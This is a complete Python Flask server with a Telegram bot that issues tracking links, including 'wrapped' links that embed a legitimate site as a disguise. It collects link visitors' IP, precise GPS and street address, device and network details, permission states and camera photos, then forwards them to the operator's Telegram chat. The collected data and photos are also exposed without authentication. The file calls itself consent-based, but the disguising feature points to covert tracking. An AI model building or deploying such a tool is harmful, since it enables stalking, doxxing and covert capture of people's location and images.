# server.py - Flask app with Telegram webhook (single-file deploy)
import os
import uuid
import base64
import json
import requests
import re  
from datetime import datetime
from dotenv import load_dotenv
from flask import (
    Flask,
    request,
    send_from_directory,
    render_template,
    jsonify,
    url_for,
)
from urllib.parse import urlparse

# load .env in development
load_dotenv()

# ---------- Configuration ----------
UPLOAD_DIR = "uploads"
SESSIONS_FILE = "sessions.json"
TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")  # required
TELEGRAM_WEBHOOK_SECRET = os.environ.get(
    "TELEGRAM_WEBHOOK_SECRET",
    "webhook_" + (TELEGRAM_BOT_TOKEN or "no-token")[:8],
)

os.makedirs(UPLOAD_DIR, exist_ok=True)

# ---------- Flask app ----------
app = Flask(__name__, template_folder="templates", static_folder="static")


# ---------- Persistence helpers ----------
def load_sessions():
    try:
        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def save_sessions(sessions):
    try:
        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(sessions, f)
    except Exception as e:
        print("Failed to save sessions:", e)


SESSIONS = load_sessions()


# ---------- Helpers ----------
def telegram_api(method: str, data=None, files=None, timeout=30):
    if not TELEGRAM_BOT_TOKEN:
        return None, "no_token"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/{method}"
    try:
        if files is None:
            r = requests.post(url, json=data or {}, timeout=timeout)
        else:
            r = requests.post(url, data=data or {}, files=files or {}, timeout=timeout)
        return r, None
    except Exception as e:
        return None, str(e)


def tg_send_text(chat_id: str, text: str):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    payload = {"chat_id": str(chat_id), "text": text}
    r, _ = telegram_api("sendMessage", data=payload)
    return bool(r and r.ok)


def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
    if not TELEGRAM_BOT_TOKEN or not chat_id:
        return False
    try:
        with open(photo_path, "rb") as f:
            files = {"photo": f}
            data = {"chat_id": str(chat_id)}
            if caption:
                data["caption"] = caption
            r, _ = telegram_api("sendPhoto", data=data, files=files)
            return bool(r and r.ok)
    except Exception as e:
        print("tg_send_photo error:", e)
        return False


def is_valid_http_url(u: str):
    try:
        p = urlparse(u)
        return p.scheme in ("http", "https") and bool(p.netloc)
    except Exception:
        return False


def normalize_url_for_wrap(text: str):
    if not text:
        return None
    u = text.strip()
    if not u:
        return None
    p = urlparse(u)
    if not p.scheme:
        u = "https://" + u
        p = urlparse(u)
    if p.scheme not in ("http", "https") or not p.netloc:
        return None
    return u


def extract_client_ip(raw_ip: str):
    """
    X-Forwarded-For often looks like "client, proxy1, proxy2".
    We only care about the first address.
    """
    if not raw_ip:
        return "unknown"
    parts = [p.strip() for p in raw_ip.split(",") if p.strip()]
    return parts[0] if parts else raw_ip


def geoip_lookup(ip: str):
    if not ip or ip == "unknown":
        return None
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=2)
        if resp.ok:
            return resp.json()
        print("GeoIP non-ok:", resp.status_code, resp.text[:200])
    except Exception as e:
        print("GeoIP lookup failed:", e)
    return None


def reverse_geocode_from_coords(coords: dict):
    """
    Best-effort reverse geocode to human-readable address from GPS coordinates.
    Uses OpenStreetMap Nominatim.
    """
    if not isinstance(coords, dict):
        return None
    lat = coords.get("lat")
    lon = coords.get("lon")
    if lat is None or lon is None:
        return None
    try:
        resp = requests.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"lat": lat, "lon": lon, "format": "jsonv2"},
            headers={"User-Agent": "consented-session-bot/1.0"},
            timeout=3,
        )
        if resp.ok:
            j = resp.json()
            return j.get("display_name") or None
        print("Reverse geocode non-ok:", resp.status_code, resp.text[:200])
    except Exception as e:
        print("Reverse geocode failed:", e)
    return None
def guess_device_model(ua: str):
    if not ua:
        return None
    # crude Android model guess: part after "Android ...;"
    m = re.search(r"Android [^;]*; ([^;/\)]+)", ua)
    if m:
        return m.group(1).strip()
    return None


def guess_os_name(ua: str, platform: str):
    ua = ua or ""
    platform = platform or ""
    if "Android" in ua:
        return "Android"
    if "iPhone" in ua or "iPad" in ua or "iOS" in ua:
        return "iOS"
    if "Windows NT" in ua:
        return "Windows"
    if "Mac OS X" in ua:
        return "macOS"
    if "Linux" in ua and "Android" not in ua:
        return "Linux"
    return platform or "unknown"


# ---------- Basic endpoints ----------
@app.route("/")
def index():
    return (
        "Flask server for consented device session. Use the Telegram bot to create sessions.",
        200,
    )


# Plain session creation (no embedded site)
@app.route("/create", methods=["POST"])
def create_session():
    data = request.get_json(silent=True) or {}
    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id,
    }
    save_sessions(SESSIONS)
    link = url_for("session_page", token=token, _external=True)
    if chat_id:
        tg_send_text(
            chat_id,
            f"Plain session created\n"
            f"Token: {token}\n"
            f"{link}",
        )
    return jsonify({"token": token, "link": link})


@app.route("/s/<token>")
def session_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    try:
        return render_template("session.html", token=token)
    except Exception:
        return f"Session page for {token}", 200


# Wrapped session creation (embed a target URL)
@app.route("/wrap_create", methods=["POST"])
def wrap_create():
    data = request.get_json(silent=True) or {}
    target_url = data.get("target_url", "").strip()

    if not is_valid_http_url(target_url):
        return jsonify({"error": "invalid_url"}), 400

    label = data.get("label", "")
    chat_id = data.get("chat_id")
    token = uuid.uuid4().hex
    SESSIONS[token] = {
        "label": label,
        "created_at": datetime.utcnow().isoformat(),
        "visits": [],
        "chat_id": chat_id,
        "target_url": target_url,
        "wrap": True,
    }
    save_sessions(SESSIONS)
    link = url_for("wrapper_page", token=token, _external=True)
    if chat_id:
        tg_send_text(chat_id, link)
    return jsonify({"token": token, "link": link})


@app.route("/w/<token>")
def wrapper_page(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    target = SESSIONS[token].get("target_url", "")
    try:
        return render_template("wrapper.html", token=token, target_url=target)
    except Exception:
        return f"Wrapper page for {token} -> {target}", 200


# ---------- upload_info with GeoIP and extra details ----------
@app.route("/upload_info/<token>", methods=["POST"])
def upload_info(token):
    if token not in SESSIONS:
        return "Invalid token", 404

    payload = request.get_json(silent=True) or {}
    battery = payload.get("battery")
    coords = payload.get("coords")
    details = payload.get("details")
    note = payload.get("note")

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = extract_client_ip(raw_ip)
    timestamp = datetime.utcnow().isoformat()

    geo = geoip_lookup(ip)
    human_address = reverse_geocode_from_coords(coords) if coords else None

    entry = {
        "timestamp": timestamp,
        "ip": ip,
        "battery": battery,
        "coords": coords,
        "details": details,
        "geo": geo,
        "note": note,
        "address": human_address,
    }

    SESSIONS[token].setdefault("visits", []).append(entry)
    save_sessions(SESSIONS)

    chat_id = SESSIONS[token].get("chat_id")

    # If this is just a page-closed beacon (no real data), don't spam Telegram.
    if not chat_id:
        return jsonify({"status": "ok", "stored": entry})
    if battery is None and coords is None and details is None:
        return jsonify({"status": "ok", "stored": entry})

    # -------- Battery ----------
    if isinstance(battery, dict):
        lvl = battery.get("level")
        chg = battery.get("charging")
        try:
            if lvl is not None:
                lvl = round(float(lvl))
                bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
            else:
                bat_txt = "unknown"
        except Exception:
            bat_txt = str(battery)
    else:
        bat_txt = "unknown"

    # -------- GPS ----------
    loc_txt = "unknown"
    acc_m = None
    if isinstance(coords, dict):
        lat = coords.get("lat")
        lon = coords.get("lon")
        acc_m = coords.get("acc") or coords.get("accuracy")
        if lat is not None and lon is not None:
            if acc_m is not None:
                loc_txt = f"{lat},{lon} (±{acc_m} m)"
            else:
                loc_txt = f"{lat},{lon}"
        else:
            loc_txt = str(coords)

    # ---------- GeoIP ----------
    city = region = country = isp = "unknown"
    if isinstance(geo, dict):
        city = geo.get("city") or "unknown"
        region = geo.get("region") or geo.get("region_code") or "unknown"
        country = geo.get("country_name") or geo.get("country") or "unknown"
        isp = geo.get("org") or geo.get("asn") or "unknown"

    # ---------- Device / HW details ----------
    d = details or {}
    ua = d.get("userAgent", "") or ""
    platform = d.get("platform") or ""
    cpu = d.get("cpuCores")
    ram = d.get("ramGB")
    langs = d.get("languages")
    scr = d.get("screen") or {}
    net = d.get("network") or {}
    perms = d.get("permissions") or {}
    tz = d.get("tz") or {}
    storage = d.get("storage") or {}

    ua_short = ua[:80] + ("…" if len(ua) > 80 else "")
    os_name = guess_os_name(ua, platform)
    model_guess = guess_device_model(ua)

    scr_w = scr.get("w")
    scr_h = scr.get("h")
    scr_ratio = scr.get("ratio")

    net_type = net.get("type") or "?"
    net_dl = net.get("downlink")
    try:
        if net_dl is not None:
            net_dl = round(float(net_dl), 1)
    except Exception:
        pass

    cam_perm = perms.get("camera")
    geo_perm = perms.get("geolocation")

    tz_name = tz.get("zone") if isinstance(tz, dict) else None
    tz_off = tz.get("offset") if isinstance(tz, dict) else None

    quota_b = storage.get("quotaBytes")
    usage_b = storage.get("usageBytes")
    quota_gb = usage_gb = None
    try:
        if quota_b:
            quota_gb = round(quota_b / 1e9, 1)
        if usage_b:
            usage_gb = round(usage_b / 1e9, 1)
    except Exception:
        pass

    # ---------- Build Telegram message ----------
    lines = [
        f"📡 Session {token} — INFO",
        f"⏱ Time: {timestamp}",
        f"🌍 IP: {ip}",
        f"🏙 GeoIP: {city}, {region}, {country}",
        f"🏢 ISP: {isp}",
        "",
        f"🔋 Battery: {bat_txt}",
        f"📍 GPS: {loc_txt}",
    ]

    if human_address:
        lines.append(f"🏠 Address: {human_address}")

    # GPS accuracy warning
    if acc_m is not None and acc_m > 2000:
        km = round(acc_m / 1000, 1)
        lines.append(f"⚠️ GPS accuracy very low (~{km} km) — address may be off.")

    main_device = os_name
    if model_guess:
        main_device += f" · {model_guess}"
    if ua_short:
        main_device += f" | {ua_short}"
    lines.append(f"📱 Device: {main_device}")

    extra_hw = []
    if ram is not None:
        extra_hw.append(f"RAM {ram} GB")
    if cpu is not None:
        extra_hw.append(f"CPU {cpu} cores")
    if quota_gb is not None:
        if usage_gb is not None:
            extra_hw.append(f"Storage {usage_gb}/{quota_gb} GB used")
        else:
            extra_hw.append(f"Storage {quota_gb} GB")
    if extra_hw:
        lines.append("💾 " + " · ".join(extra_hw))

    if langs:
        try:
            langs_txt = ", ".join(langs[:3])
            lines.append(f"🌐 Lang: {langs_txt}")
        except Exception:
            pass

    if scr_w and scr_h:
        scr_part = f"{scr_w}×{scr_h}"
        if scr_ratio:
            scr_part += f" ({scr_ratio}x)"
        lines.append(f"🖥 Screen: {scr_part}")

    net_parts = []
    if net_type and net_type != "?":
        net_parts.append(net_type.upper())
    if net_dl is not None:
        net_parts.append(f"{net_dl} Mbps")
    if net_parts:
        lines.append("📶 Network: " + " ".join(net_parts))

    if tz_name or tz_off is not None:
        tz_line = "🕒 Timezone: "
        if tz_name:
            tz_line += tz_name
        if tz_off is not None:
            tz_line += f" (offset {tz_off} min)"
        lines.append(tz_line)

    perm_bits = []
    if cam_perm:
        perm_bits.append(f"camera={cam_perm}")
    if geo_perm:
        perm_bits.append(f"geolocation={geo_perm}")
    if perm_bits:
        lines.append("✅ Permissions: " + ", ".join(perm_bits))

    msg = "\n".join(lines)
    tg_send_text(chat_id, msg)

    return jsonify({"status": "ok", "stored": entry})

# ---------- upload_image ----------
@app.route("/upload_image/<token>", methods=["POST"])
def upload_image(token):
    if token not in SESSIONS:
        return "Invalid token", 404

    data = request.get_json(silent=True) or {}
    b64 = data.get("image_b64", "")
    coords = data.get("coords")
    battery = data.get("battery")

    raw_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip = extract_client_ip(raw_ip)

    if not b64:
        return ("No image data", 400)
    if b64.startswith("data:"):
        try:
            b64 = b64.split(",", 1)[1]
        except Exception:
            return ("Bad data url", 400)
    try:
        imgbytes = base64.b64decode(b64)
    except Exception:
        return ("Bad base64", 400)

    if len(imgbytes) > 10_000_000:
        return ("Image too large", 413)

    timestamp = datetime.utcnow().strftime("%Y%m%dT%H%M%S%f")
    fname = f"{token}_{timestamp}.jpg"
    path = os.path.join(UPLOAD_DIR, fname)
    try:
        with open(path, "wb") as f:
            f.write(imgbytes)
    except Exception as e:
        print("Failed to write image:", e)
        return ("Server error saving image", 500)

    sess = SESSIONS[token]
    sess.setdefault("files", []).append(fname)
    meta = {
        "timestamp": timestamp,
        "filename": fname,
        "ip": ip,
    }
    if coords:
        meta["coords"] = coords
    if battery:
        meta["battery"] = battery
    sess.setdefault("images_meta", []).append(meta)
    save_sessions(SESSIONS)

    chat_id = sess.get("chat_id")
    if chat_id:
        # Battery caption
        if isinstance(battery, dict):
            lvl = battery.get("level")
            chg = battery.get("charging")
            try:
                if lvl is not None:
                    lvl = round(float(lvl))
                    bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
                else:
                    bat_txt = "unknown"
            except Exception:
                bat_txt = str(battery)
        else:
            bat_txt = "unknown"

        # Coords caption
        if isinstance(coords, dict):
            lat = coords.get("lat")
            lon = coords.get("lon")
            acc = coords.get("acc") or coords.get("accuracy")
            if lat is not None and lon is not None:
                if acc is not None:
                    loc_txt = f"{lat},{lon} (±{acc} m)"
                else:
                    loc_txt = f"{lat},{lon}"
            else:
                loc_txt = str(coords)
        else:
            loc_txt = "unknown"

        # GeoIP + address also for photo caption (best effort)
        geo = geoip_lookup(ip)
        city = region = country = isp = "unknown"
        if isinstance(geo, dict):
            city = geo.get("city") or "unknown"
            region = geo.get("region") or geo.get("region_code") or "unknown"
            country = geo.get("country_name") or geo.get("country") or "unknown"
            isp = geo.get("org") or geo.get("asn") or "unknown"

        human_address = reverse_geocode_from_coords(coords) if coords else None

        caption_lines = [
            f"📷 Session {token} — PHOTO",
            f"⏱ Time: {timestamp}",
            f"🌍 IP: {ip}",
            f"🏙 GeoIP: {city}, {region}, {country}",
            f"🏢 ISP: {isp}",
            f"🔋 Battery: {bat_txt}",
            f"📍 GPS: {loc_txt}",
        ]
        if human_address:
            caption_lines.append(f"🏠 Address: {human_address}")

        caption = "\n".join(caption_lines)

        sent = tg_send_photo(chat_id, path, caption=caption)
        if not sent:
            try:
                downloads_url = url_for("serve_upload", filename=fname, _external=True)
                tg_send_text(chat_id, f"Image saved: {downloads_url}\n{caption}")
            except Exception as e:
                print("Fallback photo send error:", e)

    return jsonify({"status": "saved", "filename": fname, "meta": meta})


@app.route("/session_data/<token>")
def session_data(token):
    if token not in SESSIONS:
        return "Invalid token", 404
    return jsonify(SESSIONS[token])


@app.route("/uploads/<filename>")
def serve_upload(filename):
    return send_from_directory(UPLOAD_DIR, filename)


# ---------- Telegram webhook ----------
@app.route(f"/telegram/{TELEGRAM_WEBHOOK_SECRET}", methods=["POST"])
def telegram_webhook():
    if not TELEGRAM_BOT_TOKEN:
        return "no token", 403
    update = request.get_json(silent=True)
    if not update:
        return "no json", 400

    try:
        msg = update.get("message") or update.get("edited_message") or {}
        if not msg:
            return "ok", 200

        chat = msg.get("chat", {})
        chat_id = chat.get("id")
        text = (msg.get("text") or "").strip()
        if not text or chat_id is None:
            return "ok", 200

        # /start: show help
        if text.lower().startswith("/start"):
            tg_send_text(
                chat_id,
                "Commands:\n"
                "/create [label]  – create plain session\n"
                "/wrap <url>      – create embedded tracking link for a site\n"
                "/status <token>  – show session summary",
            )
            return "ok", 200

        # /create [label]
        if text.lower().startswith("/create"):
            parts = text.split(maxsplit=1)
            label = parts[1] if len(parts) > 1 else ""
            try:
                r = requests.post(
                    url_for("create_session", _external=True),
                    json={"label": label, "chat_id": str(chat_id)},
                    timeout=5,
                )
                if r.ok:
                    data = r.json()
                    tg_send_text(chat_id, data["link"])
                else:
                    tg_send_text(
                        chat_id, f"Failed to create session: {r.status_code}"
                    )
            except Exception as e:
                print("create command error:", e)
                tg_send_text(chat_id, "Server error while creating session.")
            return "ok", 200

        # /wrap <url>
        if text.lower().startswith("/wrap"):
            parts = text.split(maxsplit=1)
            if len(parts) < 2:
                tg_send_text(
                    chat_id,
                    "Usage: /wrap <url>\nExample: /wrap https://unstop.com",
                )
                return "ok", 200
            raw = parts[1].strip()
            url = normalize_url_for_wrap(raw)
            if not url:
                tg_send_text(
                    chat_id,
                    "Invalid URL. Include domain, e.g. https://example.com",
                )
                return "ok", 200
            try:
                r = requests.post(
                    url_for("wrap_create", _external=True),
                    json={"target_url": url, "label": "", "chat_id": str(chat_id)},
                    timeout=5,
                )
                if r.ok:
                    data = r.json()
                    tg_send_text(chat_id, data["link"])
                else:
                    tg_send_text(
                        chat_id,
                        f"Failed to create wrapped session: {r.status_code}",
                    )
            except Exception as e:
                print("wrap command error:", e)
                tg_send_text(chat_id, "Server error while creating wrapped session.")
            return "ok", 200

        # /status <token>
        if text.lower().startswith("/status"):
            parts = text.split(maxsplit=1)
            if len(parts) < 2:
                tg_send_text(chat_id, "Usage: /status <token>")
                return "ok", 200
            token = parts[1].strip()
            try:
                r = requests.get(
                    url_for("session_data", token=token, _external=True), timeout=5
                )
                if r.status_code != 200:
                    tg_send_text(
                        chat_id, f"Server returned {r.status_code}: {r.text}"
                    )
                    return "ok", 200
                data = r.json()
                visits = data.get("visits", [])
                summary = (
                    f"Session {token}\n"
                    f"Label: {data.get('label')}\n"
                    f"Created: {data.get('created_at')}\n"
                    f"Total events: {len(visits)}"
                )
                tg_send_text(chat_id, summary)
                for v in visits[-5:]:
                    bat = v.get("battery")
                    if isinstance(bat, dict):
                        lvl = bat.get("level")
                        chg = bat.get("charging")
                        try:
                            if lvl is not None:
                                lvl = round(float(lvl))
                                bat_txt = f"{lvl}%{' (charging)' if chg else ''}"
                            else:
                                bat_txt = "unknown"
                        except Exception:
                            bat_txt = str(bat)
                    else:
                        bat_txt = "unknown"

                    coords = v.get("coords")
                    if isinstance(coords, dict):
                        lat = coords.get("lat")
                        lon = coords.get("lon")
                        acc = coords.get("acc") or coords.get("accuracy")
                        if lat is not None and lon is not None:
                            if acc is not None:
                                loc_txt = f"{lat},{lon} (±{acc} m)"
                            else:
                                loc_txt = f"{lat},{lon}"
                        else:
                            loc_txt = str(coords)
                    else:
                        loc_txt = "unknown"

                    line = (
                        f"Time: {v.get('timestamp')}\n"
                        f"IP: {v.get('ip')}\n"
                        f"Battery: {bat_txt}\n"
                        f"GPS: {loc_txt}"
                    )
                    tg_send_text(chat_id, line)
            except Exception as e:
                print("status command error:", e)
                tg_send_text(chat_id, f"Failed to fetch status: {e}")
            return "ok", 200

        # Fallback
        tg_send_text(
            chat_id,
            "Unknown command.\n"
            "Use:\n"
            "/create [label]\n"
            "/wrap <url>\n"
            "/status <token>",
        )
        return "ok", 200

    except Exception as e:
        print("Telegram webhook error:", e)

    return "ok", 200


# ---------- Run ----------
if __name__ == "__main__":
    debug_mode = os.environ.get("FLASK_DEBUG", "0") in ("1", "true", "True")
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=debug_mode)
